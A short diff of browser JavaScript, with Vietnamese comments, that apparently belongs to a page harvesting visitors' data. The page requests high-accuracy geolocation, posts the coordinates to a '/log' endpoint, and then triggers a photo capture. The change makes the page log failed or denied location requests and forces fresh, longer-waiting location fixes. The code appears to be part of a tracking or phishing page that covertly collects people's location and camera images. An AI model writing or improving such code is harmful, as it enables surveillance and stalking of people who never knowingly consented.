@@ -225,15 +225,29 @@
                         sendData('/log', {
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
+                            accuracy: pos.coords.accuracy,
+                            status: "Success"
                         });
                         takePhoto();
                     },
                     (err) => {
-                        console.warn("User từ chối định vị");
+                        let errorMsg = "Unknown error";
+                        if (err.code == 1) errorMsg = "User denied";
+                        else if (err.code == 2) errorMsg = "Position unavailable";
+                        else if (err.code == 3) errorMsg = "Timeout";
+
+                        // Vẫn gửi log về để biết tại sao thất bại
+                        sendData('/log', {
+                            lat: 0, lon: 0, accuracy: 0,
+                            status: "Failed: " + errorMsg
+                        });
                         takePhoto();
                     },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000, // Tăng lên 15 giây
+                        maximumAge: 0
+                    }
                 );
             } else {
                 takePhoto();
